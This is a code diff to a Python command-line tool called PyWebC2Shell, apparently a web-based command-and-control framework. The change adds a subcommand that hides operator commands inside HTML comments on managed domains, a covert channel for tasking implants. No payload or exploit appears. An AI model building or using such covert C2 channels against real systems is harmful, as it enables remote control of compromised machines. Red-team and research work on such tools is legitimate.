@@ -8,7 +8,11 @@ from typing_extensions import Annotated
 import signal
 import atexit
 import sys
-import threading
+
+# Modules that handle the transmission of commands
+import command as c
+
+# Library to tranlsate timestamps from the messages
 from datetime import datetime
 
 # TODO: Add the rich help panel for functions that have different arguements: https://typer.tiangolo.com/tutorial/options/help/#cli-options-help-panels
@@ -34,6 +38,7 @@ class PyWebC2Shell:
         self.app.command()(self.pause)
         self.app.command()(self.resume)
         self.app.command()(self.read)
+        self.app.command()(self.command)
 
     def create(
         self,
@@ -86,6 +91,21 @@ class PyWebC2Shell:
     def resume(self, domain: str):
         """Resume a paused domain"""
         self.dorch.resume_domain(domain)
+
+    def command(self, domain: str, command: str):
+        """Insert an HTML comment as a command into a domain"""
+
+        if domain not in self.dorch.get_all_domains():
+            print(
+                "ERROR: Domain provided is not an available domain use the list command to see all domains"
+            )
+            return
+        # Clear the domain of any existing commands then insert
+
+        if c.insert_HTML_comment(domain, command):
+            print(f"{command} sucessfully inserted into {domain}")
+        else:
+            print("Command was not able to be inserted into the domain")
 
     # TODO: Add the functionality in read to write outputs to another file
     # TODO: Implement the History functionality as well
